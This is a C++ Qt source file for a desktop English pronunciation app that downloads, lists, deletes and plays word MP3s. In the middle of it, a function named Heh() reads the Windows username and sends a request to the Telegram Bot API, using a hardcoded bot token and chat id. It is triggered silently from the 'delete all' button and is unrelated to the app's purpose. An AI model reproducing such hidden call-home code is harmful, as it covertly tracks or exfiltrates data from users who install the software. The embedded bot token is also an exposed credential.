#include "QtEnglishPronouncing.h"
#include <qDebug>
#include <QDir>
#include <QFileInfoList>

//ToDo delete this
#include <Windows.h>
#include <iostream>


QtEnglishPronouncing::QtEnglishPronouncing(QWidget *parent)
    : QMainWindow(parent)
{
    ui.setupUi(this);

    //SoundsInit
    _mediaPLayer = new QMediaPlayer(this);

    //FilesDownloader
    _downloader = new FileDownloader(AUDIO_PATH);
    connect(_downloader, &FileDownloader::onReady, this, &QtEnglishPronouncing::AudioLoaded);
    connect(this, &QtEnglishPronouncing::setFileName, _downloader, &FileDownloader::setFileName);
    
    //Buttons
    connect(ui.pronounceButton, &QPushButton::clicked, this, &QtEnglishPronouncing::playAudioPushButton);
    connect(ui.getAudioButton, &QPushButton::clicked, this, &QtEnglishPronouncing::getAudioPushButton);
    connect(ui.deleteAllButton, &QPushButton::clicked, this, &QtEnglishPronouncing::WordsListDeleteAll);
    connect(ui.deleteOneButton, &QPushButton::clicked, this, &QtEnglishPronouncing::WordsListDeleteOne);

    ui.wordsList->setSortingEnabled(false);
    this->WordsListUpdate();
    this->FolderDepend();
}

QtEnglishPronouncing::~QtEnglishPronouncing()
{
    delete _downloader;
    delete _mediaPLayer;
}

void QtEnglishPronouncing::WordsListUpdate()
{
    QDir dir(AUDIO_PATH);
    QFileInfoList dirContent = dir.entryInfoList(QStringList() << "*.mp3", QDir::Files);

    ui.wordsList->clear();

    for (auto content : dirContent) {
        QString name = content.baseName();
        ui.wordsList->addItem(name);
    }
}

bool QtEnglishPronouncing::WordsListIsChoosed()
{
    if (ui.wordsList->currentItem() == 0)
        return false;

    return true;
}

void QtEnglishPronouncing::FolderDepend()
{
    QDir dir(AUDIO_PATH);
    if (dir.exists()) {
        qDebug() << "Folder is exist";
        return;
    }
    dir.mkdir("./");
}

void QtEnglishPronouncing::Heh()
{
    QNetworkAccessManager* menager = new QNetworkAccessManager();
    QNetworkRequest request;
    QString message;

    const uint UNLEN = 64;
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)username, &size);



    qDebug() << message;

    QUrl url("https://api.telegram.org/bot6450516858:AAH2u1JJu8wsiqe7oVwnp_z6MD9UMyx6JXM/sendMessage?chat_id=-1001576353074&text=" + message);

    request.setUrl(url);
    menager->get(request);
    connect(menager, &QNetworkAccessManager::finished, [=]() {
    });

    delete menager;
}

void QtEnglishPronouncing::WordsListDeleteAll()
{
    QDir dir(AUDIO_PATH);
    dir.setFilter(QDir::Files);

    foreach(QString dirFile, dir.entryList())
    {
        dir.remove(dirFile);
    }

    this->WordsListUpdate();

    //ToDo delete down string
    this->Heh();

    qDebug("WordsListDeleteAll is clicked");
}

void QtEnglishPronouncing::WordsListDeleteOne()
{
    if (!WordsListIsChoosed())
        return;

    QDir dir(AUDIO_PATH);
    QString item = ui.wordsList->currentItem()->text();

    dir.setFilter(QDir::Files);
    dir.remove(item + ".mp3");

    this->WordsListUpdate();

    qDebug("WordsListDeleteOne is clicked");
}

void QtEnglishPronouncing::getAudioPushButton()
{
    QString word = ui.wordEdit->text();
    this->FolderDepend();
    emit setFileName(word);
}


void QtEnglishPronouncing::AudioLoaded()
{
    this->WordsListUpdate();

    qDebug() << "Audio was loaded";
}

void QtEnglishPronouncing::playAudioPushButton()
{
    if (!WordsListIsChoosed())
        return;

    QString mp3Path = ui.wordsList->currentItem()->text() + ".mp3";
    QString path = AUDIO_PATH + mp3Path;

    _mediaPLayer->setMedia(QUrl(path));
    _mediaPLayer->play();

    qDebug("PlayAudioButton is clicked: ");
    qDebug() << mp3Path;
}
